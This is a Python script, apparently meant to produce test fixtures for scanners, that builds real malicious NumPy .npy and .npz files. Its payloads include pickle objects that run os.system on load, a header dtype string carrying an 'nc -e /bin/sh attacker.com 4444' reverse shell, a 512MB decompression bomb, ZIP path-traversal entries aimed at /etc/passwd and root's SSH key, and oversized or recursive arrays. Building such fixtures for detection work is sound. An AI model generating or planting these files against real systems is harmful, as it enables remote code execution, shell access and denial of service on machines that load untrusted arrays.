"""
NumPy Attack Vector Generator

Generates real NumPy array files (.npy, .npz) with security attack payloads.
All methods produce genuine binary files — no JSON stubs.

Requires: numpy (pip install numpy)
"""

import pickle
import struct
import zipfile
from pathlib import Path
from typing import Dict, List, Tuple

import numpy as np


def _npy_header(dtype_str: str, shape: tuple, fortran: bool = False) -> bytes:
    """Build a .npy v1.0 file header for the given dtype/shape."""
    header_dict = f"{{'descr': '{dtype_str}', 'fortran_order': {fortran}, 'shape': {shape}, }}"
    header_bytes = header_dict.encode("latin1")
    # Pad to 64-byte boundary (magic=6, version=2, header_len=2 → prefix=10)
    pad = 64 - ((10 + len(header_bytes) + 1) % 64)
    header_bytes += b" " * pad + b"\n"
    magic = b"\x93NUMPY\x01\x00"
    return magic + struct.pack("<H", len(header_bytes)) + header_bytes


class NumPyAttackGenerator:
    """Generate NumPy-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "numpy_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def generate_object_array_exploit(self) -> Tuple[str, int]:
        """Generate NPY with object array containing RCE via pickle.

        Attack Vector:
            np.save(allow_pickle=True) + object dtype array whose
            elements have __reduce__ returning os.system().
            Triggers on np.load(allow_pickle=True).

        Severity: CRITICAL
        Detection: Object dtype inspection, pickle opcode analysis
        """
        filepath = self.output_dir / "01_object_array_exploit.npy"

        class RCEObject:
            def __reduce__(self):
                import os
                return (os.system, ("id",))

        arr = np.empty(3, dtype=object)
        arr[0] = RCEObject()
        arr[1] = RCEObject()
        arr[2] = RCEObject()
        np.save(str(filepath), arr, allow_pickle=True)

        self.generated_files.append(str(filepath))
        return str(filepath), 3

    def generate_header_corruption(self) -> Tuple[str, int]:
        """Generate NPY with a deliberately corrupted/malformed header.

        Attack Vector:
            - Invalid magic number triggers parser errors
            - Version 255.255 triggers legacy-mode bugs
            - Oversized header_len causes buffer over-read

        Severity: HIGH
        Detection: Header validation, magic byte check
        """
        filepath = self.output_dir / "02_corrupted_header.npy"

        # Bad magic, bad version, oversized header_len, then random junk
        raw = (
            b"XNUMP\xff\xff"     # wrong magic + invalid version
            + struct.pack("<H", 0xFFFF)   # oversized header_len
            + b"{'descr': 'object', 'shape': (999999999999,)}"
            + b"\x00" * 128
        )
        filepath.write_bytes(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_decompression_bomb(self) -> Tuple[str, int]:
        """Generate NPZ (ZIP) with a decompression bomb inside.

        Attack Vector:
            .npz is a ZIP archive. This one contains 512MB of 'A' bytes
            compressed to ~512KB — exhausts memory on extraction.

        Severity: HIGH
        Detection: Compression ratio analysis, size limits
        """
        filepath = self.output_dir / "03_decompression_bomb.npz"

        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.npy", b"A" * (512 * 1024 * 1024))

        self.generated_files.append(str(filepath))
        return str(filepath), 100

    def generate_malicious_metadata(self) -> Tuple[str, int]:
        """Generate NPY with code-in-dtype string in header.

        Attack Vector:
            The NPY header dict's 'descr' field contains a Python
            expression — some parsers eval() the header dict.

        Severity: CRITICAL
        Detection: Dtype string parsing, metadata inspection
        """
        filepath = self.output_dir / "04_malicious_metadata.npy"

        evil_descr = "__import__('os').system('nc -e /bin/sh attacker.com 4444')"
        header_str = f"{{'descr': '{evil_descr}', 'fortran_order': False, 'shape': (1,), }}"
        header_bytes = header_str.encode("latin1").ljust(118) + b"\n"
        raw = b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header_bytes)) + header_bytes + b"\x00" * 4
        filepath.write_bytes(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_type_confusion_attack(self) -> Tuple[str, int]:
        """Generate NPZ with type confusion between declared and actual dtypes.

        Attack Vector:
            An array declared as float32 in the header but containing
            arbitrary bytes — triggers type confusion in downstream code.

        Severity: HIGH
        Detection: Type consistency checks
        """
        filepath = self.output_dir / "05_type_confusion.npz"

        # Declare float32 shape (4,) but store object-array pickle bytes
        class Payload:
            def __reduce__(self):
                import os
                return (os.system, ("whoami",))

        obj_arr = np.array([Payload()], dtype=object)
        float_arr = np.array([1.0, 2.0, 3.0, 4.0], dtype=np.float32)

        # Save both under the same archive; declared vs actual dtype mismatch
        np.savez(str(filepath), declared_float=float_arr, actual_object=obj_arr)

        self.generated_files.append(str(filepath))
        return str(filepath), 3

    def generate_recursive_object_bomb(self) -> Tuple[str, int]:
        """Generate NPY with circular/recursive object structure.

        Attack Vector:
            Circular Python object reference inside object dtype array.
            Causes infinite recursion / stack overflow during deep traversal.

        Severity: MEDIUM
        Detection: Recursion depth limits, cycle detection
        """
        filepath = self.output_dir / "06_recursive_object_bomb.npy"

        # Build a circular reference
        inner = {"self": None, "depth": 10000}
        inner["self"] = inner  # circular

        arr = np.empty(1, dtype=object)
        arr[0] = inner
        np.save(str(filepath), arr, allow_pickle=True)

        self.generated_files.append(str(filepath))
        return str(filepath), 10000

    def generate_memmap_traversal(self) -> Tuple[str, int]:
        """Generate NPZ archive with path-traversal filenames.

        Attack Vector:
            NPZ entries with "../../etc/passwd" as the array name.
            Numpy's savez uses the key as archive member name — extraction
            can write outside the target directory.

        Severity: HIGH
        Detection: Path validation, sandbox checks
        """
        filepath = self.output_dir / "07_memmap_traversal.npz"

        # Craft the ZIP by hand so we can use traversal paths as member names
        traversal_paths = [
            "../../../../../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "../../../proc/self/environ",
        ]
        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_STORED) as zf:
            for path in traversal_paths:
                # Each entry claims to extract to a sensitive location
                data = b"\x93NUMPY\x01\x00" + b"fake_array_data"
                zf.writestr(path + ".npy", data)

        self.generated_files.append(str(filepath))
        return str(filepath), 4

    def generate_oversized_array(self) -> Tuple[str, int]:
        """Generate NPY header claiming 2^64-element array.

        Attack Vector:
            - shape: (2**32, 2**32) → 2**64 float64 elements
            - Would require 16 exabytes of RAM to load
            - Integer overflow in size calculation triggers crashes

        Severity: HIGH
        Detection: Size limit enforcement, overflow checks
        """
        filepath = self.output_dir / "08_oversized_array.npy"

        # Craft header manually claiming 2^64 elements
        shape = (2**32, 2**32)
        header_str = f"{{'descr': '<f8', 'fortran_order': False, 'shape': {shape}, }}"
        header_bytes = header_str.encode("latin1").ljust(118) + b"\n"
        raw = b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header_bytes)) + header_bytes
        # No actual data bytes — reading would immediately fail or OOM
        filepath.write_bytes(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 16

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all NumPy attack vectors."""
        return {
            "object_array_exploit": self.generate_object_array_exploit(),
            "header_corruption": self.generate_header_corruption(),
            "decompression_bomb": self.generate_decompression_bomb(),
            "malicious_metadata": self.generate_malicious_metadata(),
            "type_confusion": self.generate_type_confusion_attack(),
            "recursive_bomb": self.generate_recursive_object_bomb(),
            "memmap_traversal": self.generate_memmap_traversal(),
            "oversized_array": self.generate_oversized_array(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = NumPyAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
